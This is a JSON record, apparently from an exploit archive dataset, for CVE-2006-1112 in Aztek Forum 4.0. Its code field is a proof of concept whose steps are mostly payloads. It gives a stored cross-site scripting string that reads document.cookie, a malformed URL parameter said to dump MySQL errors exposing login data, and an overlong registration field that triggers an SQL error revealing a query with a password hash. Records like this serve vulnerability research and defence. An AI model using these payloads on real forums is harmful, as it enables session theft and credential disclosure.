{
  "id": "1547",
  "title": "Aztek Forum 4.00 - Cross-Site Scripting / SQL Injection",
  "cve": "CVE-2006-1112",
  "vuln_type": "sqli",
  "code": "/*==========================================*/\r\n// AZTEK forums 4.0 multiple vulnerabilities (PoC)\r\n// Product: AZTEK forums\r\n// URL: http://www.forum-aztek.com/\r\n// RISK: high\r\n/*==========================================*/\r\n\r\n[PoC]\r\n\r\n1- XSS\r\n\t- Post a message including the following line: &lt;/textarea&gt;'\"><script>alert(document.cookie)</script>\r\n\t- Valid.\r\n\t- Click on \"Citer\" to execute the script.\r\n\r\n\tYou can also do it with the edit button (after loging in).\r\n\r\n2-\r\n\tDo the following request : http://SOME_HOST/forum/index.php?msg=*/*\r\n\tIt will dump a MySQL error message which can dump login:pw infos.\r\n\r\n3-\r\n\t- Register with :\r\n\tlogin : 6b 66 73 6a 64 61 20 54 50 68 70 45 72 72 6f 72 45 78 63 65\r\n\t70 74 69 6f 6e 0d 0a 44 65 73 63 72 69 70 74 69 6f 6e 0d 0a 5b 57 61\r\n\t72 6e 69 6e 67 5d 20 6d 79 73 71 6c 5f 63 6f 6e 6e 65 63 74 28 29 20\r\n\t5b 3c 61 20 68 72 65 66 3d 27 66 75\r\n        [...a huge login name...]\r\n\t6e 63 74 69 6f 6e 2e 6d 79 73 71 6c 2d 63 6f 6e 6e 65 63 74 27 3e 66\r\n\t75 6e 63 74 69 6f 6e 2e 6d 79 73 71 6c 2d 63 6f 6e\r\n\tpasswd:blabla\r\n\temail:blabla@gmail.com\r\n\t- Valid.\r\n\r\n\tThis form is not validated at all, so it can cause a MySQL error like :\r\n\r\n\tMysql error in file \r\n\t/home/httpd/vhosts/www.**********.com/web/forum/index/actions.php in\r\n\tfunction subscribe at line 222\r\n\r\n\tMysql query error :\r\n\tINSERT INTO atk_users (login,owner,passwd,email,show_email,alert_mp,subscribe)\r\n\t\tVALUES ('6b 66 73 6a 64 61 20 54 50 68 \r\n\t[...]','admin','atHax4CLQE42Q','blabla@gmail.com','1','1','1141202540')\r\n\r\n\tPlease note this error and contact your administrator.\r\n\r\n--\r\nPoC by lorenzo [GHT], http://ght.c.la/\r\n\r\n# milw0rm.com [2006-03-02]",
  "url": "https://www.exploit-db.com/exploits/1547"
}